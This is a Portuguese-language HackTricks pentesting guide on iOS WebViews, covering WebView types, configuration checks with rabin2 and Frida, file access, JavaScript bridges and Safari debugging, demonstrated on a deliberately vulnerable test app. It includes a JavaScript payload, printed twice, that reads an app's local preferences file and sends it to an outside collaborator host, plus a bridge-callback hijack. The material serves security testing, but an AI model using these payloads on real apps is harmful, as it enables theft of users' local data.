## WebViews iOS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas t√©cnicas de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Tipos de WebViews

WebViews s√£o componentes de navegador in-app para exibir **conte√∫do web** interativo. Eles podem ser usados para incorporar conte√∫do web diretamente na interface do usu√°rio de um aplicativo. Os iOS WebViews **suportam** a execu√ß√£o de **JavaScript** **por padr√£o**, portanto, a inje√ß√£o de script e os ataques de Cross-Site Scripting podem afet√°-los.

* [**UIWebView**](https://developer.apple.com/documentation/uikit/uiwebview)**:** O UIWebView est√° obsoleto a partir do iOS 12 e n√£o deve ser usado. N√£o deve ser usado. **O JavaScript n√£o pode ser desativado**.
* [**WKWebView**](https://developer.apple.com/documentation/webkit/wkwebview): Esta √© a escolha apropriada para estender a funcionalidade do aplicativo, controlando o conte√∫do exibido.
  * **JavaScript** √© habilitado por padr√£o, mas gra√ßas √† propriedade **`javaScriptEnabled`** de `WKWebView`, ele **pode ser completamente desativado**, impedindo todas as falhas de inje√ß√£o de script.
  * A propriedade **`JavaScriptCanOpenWindowsAutomatically`** pode ser usada para **impedir** que o JavaScript **abra novas janelas**, como pop-ups.
  * A propriedade **`hasOnlySecureContent`** pode ser usada para verificar se os recursos carregados pelo WebView s√£o recuperados por meio de conex√µes criptografadas.
  * `WKWebView` implementa renderiza√ß√£o fora do processo, portanto, **bugs de corrup√ß√£o de mem√≥ria n√£o afetar√£o** o processo principal do aplicativo.
*   [**SFSafariViewController**](https://developer.apple.com/documentation/safariservices/sfsafariviewcontroller)**:** Deve ser usado para fornecer uma experi√™ncia de visualiza√ß√£o da web **generalizada**. Esses WebViews podem ser facilmente identificados, pois possuem um layout caracter√≠stico que inclui os seguintes elementos:

    * Um campo de endere√ßo somente leitura com um indicador de seguran√ßa.
    * Um bot√£o de a√ß√£o ("**Compartilhar**").
    * Um bot√£o **Conclu√≠do**, bot√µes de navega√ß√£o para tr√°s e para frente e um bot√£o "Safari" para abrir a p√°gina diretamente no Safari.

    <img src="https://gblobscdn.gitbook.com/assets%2F-LH00RC4WVf3-6Ou4e0l%2F-Lf1APQHyCHdAvoJSvc_%2F-Lf1AQxr7FPsOyPFSGcs%2Fsfsafariviewcontroller.png?alt=media" alt="" data-size="original">

    * **O JavaScript n√£o pode ser desativado** em `SFSafariViewController` e esta √© uma das raz√µes pelas quais o uso de `WKWebView` √© recomendado quando o objetivo √© estender a interface do usu√°rio do aplicativo.
    * `SFSafariViewController` tamb√©m **compartilha cookies** e outros dados do site com o **Safari**.
    * A atividade e intera√ß√£o do usu√°rio com um `SFSafariViewController` **n√£o s√£o vis√≠veis para o aplicativo**, que n√£o pode acessar dados de preenchimento autom√°tico, hist√≥rico de navega√ß√£o ou dados do site.
    * De acordo com as Diretrizes de Revis√£o da App Store, os `SFSafariViewController`s **n√£o podem ser ocultados ou obscurecidos por outras visualiza√ß√µes ou camadas**.

## Descobrindo a Configura√ß√£o dos WebViews

### An√°lise Est√°tica

**UIWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
489 0x0002fee9 0x10002fee9   9  10 (5.__TEXT.__cstring) ascii UIWebView
896 0x0003c813 0x0003c813  24  25 () ascii @_OBJC_CLASS_$_UIWebView
1754 0x00059599 0x00059599  23  24 () ascii _OBJC_CLASS_$_UIWebView
```
**WKWebView**

O `WKWebView` √© um componente do iOS que permite exibir conte√∫do da web em um aplicativo. Ele √© mais seguro e eficiente do que o antigo `UIWebView`. No entanto, ainda √© poss√≠vel explorar vulnerabilidades em aplicativos que usam o `WKWebView`.

Algumas t√©cnicas de teste de penetra√ß√£o que podem ser usadas em aplicativos que usam o `WKWebView` incluem:

- **Inje√ß√£o de JavaScript**: √© poss√≠vel injetar c√≥digo JavaScript malicioso em um aplicativo que usa o `WKWebView`. Isso pode ser usado para roubar informa√ß√µes do usu√°rio ou executar a√ß√µes maliciosas em nome do usu√°rio.

- **Roubo de cookies**: os cookies armazenados pelo `WKWebView` podem ser acessados ‚Äã‚Äãpor um invasor. Isso pode permitir que o invasor assuma a identidade do usu√°rio e acesse informa√ß√µes confidenciais.

- **Redirecionamento de URL**: um invasor pode redirecionar o usu√°rio para um site malicioso usando o `WKWebView`. Isso pode ser usado para roubar informa√ß√µes do usu√°rio ou instalar malware no dispositivo.

- **Vazamento de informa√ß√µes**: informa√ß√µes confidenciais podem ser vazadas por meio do `WKWebView`. Isso pode incluir informa√ß√µes de login, senhas e outras informa√ß√µes pessoais.

Para mitigar essas vulnerabilidades, os desenvolvedores devem implementar pr√°ticas de seguran√ßa recomendadas, como validar entradas de usu√°rio, criptografar dados confidenciais e usar bibliotecas de terceiros confi√°veis.
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
490 0x0002fef3 0x10002fef3   9  10 (5.__TEXT.__cstring) ascii WKWebView
625 0x00031670 0x100031670  17  18 (5.__TEXT.__cstring) ascii unwindToWKWebView
904 0x0003c960 0x0003c960  24  25 () ascii @_OBJC_CLASS_$_WKWebView
1757 0x000595e4 0x000595e4  23  24 () ascii _OBJC_CLASS_$_WKWebView
```
Alternativamente, voc√™ tamb√©m pode procurar por m√©todos conhecidos dessas classes WebView. Por exemplo, procure pelo m√©todo usado para inicializar um WKWebView ([`init(frame:configuration:)`](https://developer.apple.com/documentation/webkit/wkwebview/1414998-init)):
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
0x5c3ac 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC
0x5d97a 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO
0x6b5d5 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC
0x6c3fa 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO
```
#### Testando a Configura√ß√£o do JavaScript

Para `WKWebView`s, como uma melhor pr√°tica, o JavaScript deve ser desativado, a menos que seja explicitamente necess√°rio. Para verificar se o JavaScript foi desativado corretamente, pesquise no projeto por usos de `WKPreferences` e verifique se a propriedade [`javaScriptEnabled`](https://developer.apple.com/documentation/webkit/wkpreferences/1536203-javascriptenabled) est√° definida como `false`:
```
let webPreferences = WKPreferences()
webPreferences.javaScriptEnabled = false
```
Se voc√™ tiver apenas o bin√°rio compilado, pode procurar por isso nele:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
391 0x0002f2c7 0x10002f2c7  17  18 (4.__TEXT.__objc_methname) ascii javaScriptEnabled
392 0x0002f2d9 0x10002f2d9  21  22 (4.__TEXT.__objc_methname) ascii setJavaScriptEnabled
```
#### Testando OnlySecureContent

Ao contr√°rio dos `UIWebView`s, ao usar `WKWebView`s √© poss√≠vel detectar [conte√∫do misto](https://developers.google.com/web/fundamentals/security/prevent-mixed-content/fixing-mixed-content?hl=en) (conte√∫do HTTP carregado de uma p√°gina HTTPS). Usando o m√©todo [`hasOnlySecureContent`](https://developer.apple.com/documentation/webkit/wkwebview/1415002-hasonlysecurecontent), √© poss√≠vel verificar se todos os recursos na p√°gina foram carregados por meio de conex√µes criptografadas com seguran√ßa.\
No bin√°rio compilado:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
Tamb√©m √© poss√≠vel pesquisar no c√≥digo-fonte ou nas strings a string "http://". No entanto, isso n√£o significa necessariamente que h√° um problema de conte√∫do misto. Saiba mais sobre conte√∫do misto na [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/Security/Mixed\_content).

### An√°lise Din√¢mica

√â poss√≠vel inspecionar o heap via `ObjC.choose()` para encontrar inst√¢ncias dos diferentes tipos de WebViews e tamb√©m procurar pelas propriedades `javaScriptEnabled` e `hasonlysecurecontent`:

{% code title="webviews_inspector.js" %}
```javascript
ObjC.choose(ObjC.classes['UIWebView'], {
  onMatch: function (ui) {
    console.log('onMatch: ', ui);
    console.log('URL: ', ui.request().toString());
  },
  onComplete: function () {
    console.log('done for UIWebView!');
  }
});

ObjC.choose(ObjC.classes['WKWebView'], {
  onMatch: function (wk) {
    console.log('onMatch: ', wk);
    console.log('URL: ', wk.URL().toString());
  },
  onComplete: function () {
    console.log('done for WKWebView!');
  }
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
  onMatch: function (sf) {
    console.log('onMatch: ', sf);
  },
  onComplete: function () {
    console.log('done for SFSafariViewController!');
  }
});

ObjC.choose(ObjC.classes['WKWebView'], {
  onMatch: function (wk) {
    console.log('onMatch: ', wk);
    console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
  }
});

ObjC.choose(ObjC.classes['WKWebView'], {
  onMatch: function (wk) {
    console.log('onMatch: ', wk);
    console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
  }
});
```
{% endcode %}

Carregue-o com:
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js

onMatch:  <WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = <CALayer: 0x1c4238f20>>

hasOnlySecureContent:  false
```
## Manipula√ß√£o de Protocolo WebView

V√°rios esquemas padr√£o est√£o dispon√≠veis que est√£o sendo interpretados em um WebView no iOS, por exemplo:

* http(s)://
* file://
* tel://

WebViews podem carregar conte√∫do remoto de um endpoint, mas tamb√©m podem carregar conte√∫do local do diret√≥rio de dados do aplicativo. Se o conte√∫do local for carregado, o usu√°rio n√£o deve ser capaz de influenciar o nome do arquivo ou o caminho usado para carregar o arquivo, e os usu√°rios n√£o devem ser capazes de editar o arquivo carregado.

### Carregamento de conte√∫do WebView

* **UIWebView**: Ele pode usar m√©todos obsoletos [`loadHTMLString:baseURL:`](https://developer.apple.com/documentation/uikit/uiwebview/1617979-loadhtmlstring?language=objc) ou [`loadData:MIMEType:textEncodingName:baseURL:`](https://developer.apple.com/documentation/uikit/uiwebview/1617941-loaddata?language=objc) para carregar conte√∫do.
* **WKWebView**: Ele pode usar os m√©todos [`loadHTMLString:baseURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1415004-loadhtmlstring?language=objc) ou [`loadData:MIMEType:textEncodingName:baseURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1415011-loaddata?language=objc) para carregar arquivos HTML locais e `loadRequest:` para conte√∫do da web. Tipicamente, os arquivos locais s√£o carregados em combina√ß√£o com m√©todos incluindo, entre outros: [`pathForResource:ofType:`](https://developer.apple.com/documentation/foundation/nsbundle/1410989-pathforresource), [`URLForResource:withExtension:`](https://developer.apple.com/documentation/foundation/nsbundle/1411540-urlforresource?language=objc) ou [`init(contentsOf:encoding:)`](https://developer.apple.com/documentation/swift/string/3126736-init). Al√©m disso, voc√™ tamb√©m deve verificar se o aplicativo est√° usando o m√©todo [`loadFileURL:allowingReadAccessToURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1414973-loadfileurl?language=objc). Seu primeiro par√¢metro √© `URL` e cont√©m a URL a ser carregada no WebView, seu segundo par√¢metro `allowingReadAccessToURL` pode conter um √∫nico arquivo ou um diret√≥rio. Se contiver um √∫nico arquivo, esse arquivo estar√° dispon√≠vel para o WebView. No entanto, se ele contiver um diret√≥rio, todos os arquivos nesse **diret√≥rio ser√£o disponibilizados para o WebView**. Portanto, vale a pena inspecionar isso e, caso seja um diret√≥rio, verificar que nenhum dado sens√≠vel possa ser encontrado dentro dele.

Se voc√™ tiver o c√≥digo-fonte, pode procurar por esses m√©todos. Tendo o **bin√°rio compilado**, voc√™ tamb√©m pode procurar por esses m√©todos:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
### Acesso a Arquivos

* **UIWebView:**
  * O esquema `file://` est√° sempre habilitado.
  * O acesso a arquivos a partir de URLs `file://` est√° sempre habilitado.
  * O acesso universal a partir de URLs `file://` est√° sempre habilitado.
  * Se voc√™ recuperar a origem efetiva de um `UIWebView` onde `baseURL` tamb√©m √© definido como `nil`, voc√™ ver√° que ela **n√£o √© definida como "null"**, em vez disso, voc√™ obter√° algo semelhante ao seguinte: `applewebdata://5361016c-f4a0-4305-816b-65411fc1d78`. Essa origem "applewebdata://" √© semelhante √† origem "file://" pois **n√£o implementa a Pol√≠tica de Mesma Origem** e permite o acesso a arquivos locais e a qualquer recurso da web. 

{% tabs %}
{% tab title="exfiltrate_file" %}
```javascript
String.prototype.hexEncode = function(){
    var hex, i;
    var result = "";
    for (i=0; i<this.length; i++) {
        hex = this.charCodeAt(i).toString(16);
        result += ("000"+hex).slice(-4);
    }
    return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        var xhr2 = new XMLHttpRequest();
        xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
        xhr2.send(null);
    }
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
{% endtab %}
{% endtabs %}

* **WKWebView**:
  * **`allowFileAccessFromFileURLs`** (`WKPreferences`, `false` por padr√£o): permite que o JavaScript em execu√ß√£o no contexto de um URL do esquema `file://` acesse o conte√∫do de outros URLs do esquema `file://`.
  * **`allowUniversalAccessFromFileURLs`** (`WKWebViewConfiguration`, `false` por padr√£o): permite que o JavaScript em execu√ß√£o no contexto de um URL do esquema `file://` acesse o conte√∫do de qualquer origem.

Voc√™ pode procurar por essas fun√ß√µes no c√≥digo-fonte do aplicativo ou no bin√°rio compilado.\
Al√©m disso, voc√™ pode usar o seguinte script do frida para encontrar essas informa√ß√µes:
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
  onMatch: function (wk) {
    console.log('onMatch: ', wk);
    console.log('URL: ', wk.URL().toString());
    console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
    console.log('allowFileAccessFromFileURLs: ',
            wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
    console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
    console.log('allowUniversalAccessFromFileURLs: ',
            wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
  },
  onComplete: function () {
    console.log('done for WKWebView!');
  }
});
```

```bash
frida -U -f com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js

onMatch:  <WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = <CALayer: 0x1c4238f20>>
URL:  file:///var/mobile/Containers/Data/Application/A654D169-1DB7-429C-9DB9-A871389A8BAA/
        Library/WKWebView/scenario1.html
javaScriptEnabled:  true
allowFileAccessFromFileURLs:  0
hasOnlySecureContent:  false
allowUniversalAccessFromFileURLs:  0
```
#### Extrair arquivos arbitr√°rios
```javascript
//For some reason this payload doesn't work!!
//Let me know if you know how to exfiltrate local files from a WKWebView
String.prototype.hexEncode = function(){
    var hex, i;
    var result = "";
    for (i=0; i<this.length; i++) {
        hex = this.charCodeAt(i).toString(16);
        result += ("000"+hex).slice(-4);
    }
    return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        var xhr2 = new XMLHttpRequest();
        xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
        xhr2.send(null);
    }
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## M√©todos nativos expostos por meio de WebViews

Desde o iOS 7, a Apple introduziu APIs que permitem a **comunica√ß√£o entre o tempo de execu√ß√£o JavaScript na WebView e os objetos nativos** Swift ou Objective-C.

Existem duas maneiras fundamentais de como o c√≥digo nativo e o JavaScript podem se comunicar:

* **JSContext**: Quando um bloco Objective-C ou Swift √© atribu√≠do a um identificador em um `JSContext`, o JavaScriptCore automaticamente envolve o bloco em uma fun√ß√£o JavaScript.
* **Protocolo JSExport**: Propriedades, m√©todos de inst√¢ncia e m√©todos de classe declarados em um protocolo herdado de `JSExport` s√£o mapeados para objetos JavaScript que est√£o dispon√≠veis para todo o c√≥digo JavaScript. Modifica√ß√µes de objetos que est√£o no ambiente JavaScript s√£o refletidas no ambiente nativo.

Observe que **apenas membros de classe definidos no protocolo `JSExport`** s√£o tornados acess√≠veis ao c√≥digo JavaScript.\
Procure por c√≥digo que mapeia objetos nativos para o `JSContext` associado a uma WebView e analise que funcionalidade ele exp√µe, por exemplo, nenhum dado sens√≠vel deve ser acess√≠vel e exposto √†s WebViews.\
Em Objective-C, o `JSContext` associado a uma `UIWebView` √© obtido da seguinte forma:
```objectivec
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
O c√≥digo JavaScript em um **`WKWebView` ainda pode enviar mensagens de volta para o aplicativo nativo, mas, em contraste com o `UIWebView`, n√£o √© poss√≠vel fazer refer√™ncia direta ao `JSContext`** de um `WKWebView`. Em vez disso, a comunica√ß√£o √© implementada usando um sistema de mensagens e usando a fun√ß√£o `postMessage`, que automaticamente serializa objetos JavaScript em objetos nativos Objective-C ou Swift. Manipuladores de mensagens s√£o configurados usando o m√©todo [`add(_ scriptMessageHandler:name:)`](https://developer.apple.com/documentation/webkit/wkusercontentcontroller/1537172-add).

### Habilitando o JavascriptBridge
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
    options_dict["javaScriptBridge"]?.value = enabled
    let userContentController = wkWebViewConfiguration.userContentController
    userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

    if enabled {
            let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
            userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
    }
}
```
### Enviando Mensagem

Adicionar um manipulador de mensagem de script com o nome `"name"` (ou `"javaScriptBridge"` no exemplo acima) faz com que a fun√ß√£o JavaScript `window.webkit.messageHandlers.myJavaScriptMessageHandler.postMessage` seja definida em todos os quadros em todas as visualiza√ß√µes da web que usam o controlador de conte√∫do do usu√°rio. Pode ent√£o ser [usado a partir do arquivo HTML assim](https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/d4e2d9efbde8841bf7e4a8800418dda6bb116ec6/WheresMyBrowser/web/WKWebView/scenario3.html#L33):
```javascript
function invokeNativeOperation() {
    value1 = document.getElementById("value1").value
    value2 = document.getElementById("value2").value
    window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}
//After testing the previos funtion I got the error TypeError: undefined is not an object (evaluating 'window.webkit.messageHandlers')
//But the following code worked to call the exposed javascriptbridge with the args "addNumbers", "1", "2"

document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
Uma vez que a fun√ß√£o nativa √© executada, geralmente **executar√° algum JavaScript dentro da p√°gina da web** (veja `evaluateJavascript` abaixo) e voc√™ pode estar interessado em **substituir a fun√ß√£o** que ser√° executada para **roubar o resultado**.\
Por exemplo, no script abaixo, a fun√ß√£o **`javascriptBridgeCallBack`** ser√° executada com 2 par√¢metros (a fun√ß√£o chamada e o **resultado**). Se voc√™ controla o HTML que ser√° carregado, pode criar um **alerta com o resultado** como:
```markup
<html>
    <script>
        document.location = "javascriptbridge://getSecret"
        function javascriptBridgeCallBack(name, result) {
            alert(result);
        }
    </script>
</html>
```
### Fun√ß√£o Chamada

A fun√ß√£o chamada est√° localizada em [`JavaScriptBridgeMessageHandler.swift`](https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/b8d4abda4000aa509c7a5de79e5c90360d1d0849/WheresMyBrowser/JavaScriptBridgeMessageHandler.swift#L29):
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {

//...

case "multiplyNumbers":

        let arg1 = Double(messageArray[1])!
        let arg2 = Double(messageArray[2])!
        result = String(arg1 * arg2)
//...

let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
```
### Testando

Para testar o envio de uma mensagem `postMessage` dentro de um aplicativo, voc√™ pode:

* Alterar a resposta do servidor (MitM)
* Realizar uma instrumenta√ß√£o din√¢mica e injetar a carga √∫til JavaScript usando frameworks como Frida e as fun√ß√µes de avalia√ß√£o JavaScript correspondentes dispon√≠veis para os iOS WebViews ([`stringByEvaluatingJavaScriptFromString:`](https://developer.apple.com/documentation/uikit/uiwebview/1617963-stringbyevaluatingjavascriptfrom?language=objc) para `UIWebView` e [`evaluateJavaScript:completionHandler:`](https://developer.apple.com/documentation/webkit/wkwebview/1415017-evaluatejavascript?language=objc) para `WKWebView`).

## Depura√ß√£o de iOS WebViews

(Tutorial de [https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews))

Nos webviews do iOS, as mensagens passadas para `console.log()` _n√£o_ s√£o impressas nos logs do Xcode. Ainda √© relativamente f√°cil depurar o conte√∫do da web com as ferramentas de desenvolvedor do Safari, embora haja algumas limita√ß√µes:

* Depurar webviews do iOS requer o Safari, portanto, seu computador de desenvolvimento deve estar executando o macOS.
* Voc√™ s√≥ pode depurar webviews em aplicativos carregados em seu dispositivo por meio do Xcode. Voc√™ n√£o pode depurar webviews em aplicativos instalados por meio da App Store ou do Apple Configurator.

Com essas limita√ß√µes em mente, aqui est√£o as etapas para depurar remotamente um webview no iOS:

* Primeiro, ative o Safari Web Inspector em seu dispositivo iOS abrindo o aplicativo _Configura√ß√µes_ do iOS, navegando at√© **Configura√ß√µes > Safari > Avan√ßado** e ativando a op√ß√£o _Web Inspector_.

![iOS Safari settings](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/ios-safari-settings.jpg)

* Em seguida, voc√™ tamb√©m deve habilitar as ferramentas de desenvolvedor no Safari em seu computador de desenvolvimento. Inicie o Safari em sua m√°quina de desenvolvimento e navegue at√© **Safari > Prefer√™ncias** na barra de menus. Na janela de prefer√™ncias que aparece, clique na guia _Avan√ßado_ e, em seguida, habilite a op√ß√£o _Mostrar menu Desenvolver_ na parte inferior. Depois de fazer isso, voc√™ pode fechar a janela de prefer√™ncias.

![Mac Safari settings](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-settings.jpg)

* Conecte seu dispositivo iOS ao seu computador de desenvolvimento e inicie seu aplicativo.
* No Safari em seu computador de desenvolvimento, clique em _Desenvolver_ na barra de menus e passe o mouse sobre a op√ß√£o suspensa que √© o nome do seu dispositivo iOS para mostrar uma lista de inst√¢ncias de webview em execu√ß√£o em seu dispositivo iOS.

![Mac Safari develop menu](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-develop-menu.jpg)

* Clique na op√ß√£o suspensa para o webview que deseja depurar. Isso abrir√° uma nova janela do Safari Web Inspector para inspecionar o webview.

![Safari Web Inspector window](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-inspector.jpg)

## Refer√™ncias

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas t√©cnicas de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
